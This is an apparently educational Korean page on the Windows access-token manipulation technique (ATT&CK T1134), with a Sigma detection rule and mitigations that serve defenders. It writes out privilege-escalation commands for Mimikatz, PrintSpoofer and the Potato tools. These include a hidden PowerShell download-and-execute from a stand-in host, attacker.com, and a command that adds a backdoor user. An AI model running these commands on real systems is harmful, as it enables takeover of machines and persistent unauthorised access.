# T1134 — Access Token Manipulation

## 개요

**TA0004 / T1134**  
Windows 액세스 토큰을 조작하여 권한을 상승시키거나 다른 사용자의 보안 컨텍스트로 실행하는 기법입니다. Token Impersonation/Theft, Create Process with Token, Make and Impersonate Token 등의 서브 기법이 있습니다.

---

## 동작 방식

1. 현재 프로세스에서 사용 가능한 토큰 목록 열거
2. 높은 권한을 가진 토큰(SYSTEM, 도메인 관리자 등) 탈취 또는 위장
3. 탈취한 토큰으로 새로운 프로세스 실행 또는 현재 스레드에 적용
4. SYSTEM 또는 도메인 관리자 권한으로 후속 작업 수행

**핵심 Windows API:**
- `ImpersonateLoggedOnUser()`
- `DuplicateTokenEx()`
- `CreateProcessWithTokenW()`
- `SetThreadToken()`

---

## 주요 커맨드 / 실습

### Mimikatz Token Manipulation
```cmd
# 현재 사용 가능한 토큰 목록 조회
mimikatz# token::list

# SYSTEM 토큰으로 권한 상승
mimikatz# token::elevate

# 특정 사용자 토큰으로 위장
mimikatz# token::elevate /domainadmin

# 원래 토큰으로 복원
mimikatz# token::revert
```

### PrintSpoofer (SeImpersonatePrivilege 악용)
```cmd
# 현재 권한 확인
whoami /priv

# SeImpersonatePrivilege가 있을 경우 SYSTEM 획득
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

### RoguePotato
```cmd
# RoguePotato로 SYSTEM 권한 획득 (SeImpersonatePrivilege 필요)
RoguePotato.exe -r 192.168.1.100 -e "cmd.exe" -l 9999

# SweetPotato (통합 버전)
SweetPotato.exe -a "/c net user hacker Password123! /add"
```

### 권한 확인
```cmd
# 현재 사용자 및 권한 확인
whoami /all
whoami /priv

# 프로세스별 토큰 확인
Get-Process | Select-Object Name, Id, @{N='User';E={$_.GetOwner().User}}
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Suspicious Token Manipulation via Mimikatz or PrintSpoofer
id: a5ae56dc-5e73-4a28-9f00-dce8c33b40f2
status: stable
description: Detects token manipulation attempts via known tools
logsource:
    product: windows
    category: process_creation
detection:
    selection_mimikatz:
        CommandLine|contains:
            - 'token::elevate'
            - 'token::impersonate'
            - 'token::list'
    selection_printspoofer:
        CommandLine|contains: 'PrintSpoofer'
    selection_roguepotato:
        CommandLine|contains:
            - 'RoguePotato'
            - 'SweetPotato'
    condition: 1 of selection_*
falsepositives:
    - Legitimate administrative tools (rare)
level: high
tags:
    - attack.privilege_escalation
    - attack.t1134
```

---

## 대응 방안

1. SeImpersonatePrivilege 권한 최소화 (서비스 계정에 불필요한 권한 제거)
2. RunAsPPL(Protected Process Light) 활성화로 LSASS 보호
3. Credential Guard 활성화
4. 서비스 계정에 최소 권한 원칙 적용
5. Sysmon EventID 1 (프로세스 생성) 로깅으로 의심스러운 자식 프로세스 탐지
6. EDR 솔루션을 통한 토큰 조작 행위 실시간 탐지

---

## 참고자료
- [MITRE ATT&CK T1134](https://attack.mitre.org/techniques/T1134/)
- [PrintSpoofer GitHub](https://github.com/itm4n/PrintSpoofer)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Potato Exploits 계보](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
